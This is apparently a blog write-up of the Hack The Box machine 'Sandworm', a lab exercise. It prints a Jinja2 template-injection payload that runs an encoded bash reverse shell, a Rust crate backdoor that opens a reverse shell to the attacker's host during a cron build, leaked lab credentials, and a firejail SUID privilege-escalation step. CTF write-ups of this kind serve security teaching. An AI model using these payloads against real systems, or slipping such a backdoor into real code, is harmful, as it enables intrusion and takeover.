---
layout: post
title: "HTB: Sandworm"
subtitle: "Jinja2 SSTI in a PGP key UID for RCE inside firejail, a writable Rust crate to pivot to atlas, then a firejail SUID exploit to root"
date: 2023-07-16
tags: [htb, linux, ssti, cargo, firejail, privesc]
category: writeups
tldr: "ssa.htb verified submitted PGP keys, and the key UID was rendered through Jinja2, giving SSTI and RCE inside a firejail sandbox. A leaked httpie session handed me silentobserver over SSH. A root cron built a writable Rust crate as atlas, so I backdoored the logger crate, then used a firejail SUID exploit for root."
---
{% raw %}

## the box

Sandworm is a Linux box for the "Secret Spy Agency" serving a Flask app over HTTPS on `ssa.htb`, plus SSH. The site lets you submit and verify PGP-signed messages.

## recon

Directory enumeration found `/guide`, `/pgp`, and a `/process` endpoint. The guide page had a form to verify a signature against a submitted public key. Community hints and the way the UID was echoed back pointed at server-side template injection in the key's user ID field.

## foothold

I generated a GPG key with a Jinja2 payload as the real name, then submitted it.

```
Real name: {{7*7}}
Email address: hobala@hobala.hobala
```

The verification output rendered `49`, confirming Jinja2 SSTI. Simple payloads were filtered, so I base64-encoded the reverse shell and decoded it server-side inside the template.

```
{{ self.init.globals.builtins.import('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS8xMzM3IDA+JjE= | base64 -d | bash').read() }}
```

That gave a shell, but as a low-privilege web user confined to a firejail sandbox.

## user

Poking around the web user's home, I found a stored httpie session with credentials in cleartext.

```
cat ~/.config/httpie/sessions/localhost_5000/admin.json
"auth": { "password": "quietLiketheWind22", "username": "silentobserver" }
```

`silentobserver:quietLiketheWind22` worked over SSH and gave the user flag.

## root

Process monitoring showed a root job repeatedly building a Rust project as atlas.

```
UID=0 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
```

`tipnet` depended on a local crate in `/opt/crates/logger`, and I had write access to its source.

```
-rw-rw-r-- 1 atlas silentobserver 732 May 4 17:12 lib.rs
```

I replaced the `log` function in `lib.rs` with a reverse shell so it fires whenever `tipnet` is compiled and run.

```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn log(user: &str, query: &str, justification: &str) {
        let sock = TcpStream::connect("10.10.16.29:4444").unwrap();
        let fd = sock.as_raw_fd();
        Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn().unwrap().wait().unwrap();
}
```

When the cron rebuilt the project, the backdoored crate ran and gave a shell as atlas. From there, the SUID binary list flagged firejail.

```
find / -perm /4000 2> /dev/null
/usr/local/bin/firejail
```

This firejail version has a known SUID privesc using `--join` against a helper sandbox the exploit sets up. I ran the PoC as atlas, then joined the printed PID from a second shell.

```
You can now run 'firejail --join=1126645' in another terminal to obtain a shell
```

Joining and running `su -` gave a root shell and the root flag.

## takeaway

SSTI in a PGP UID gave code execution, but only inside a sandbox, so the leaked httpie session was the real way out. The atlas pivot was a classic writable-dependency build: a root cron compiled code I controlled. Root was a known firejail SUID exploit.
{% endraw %}
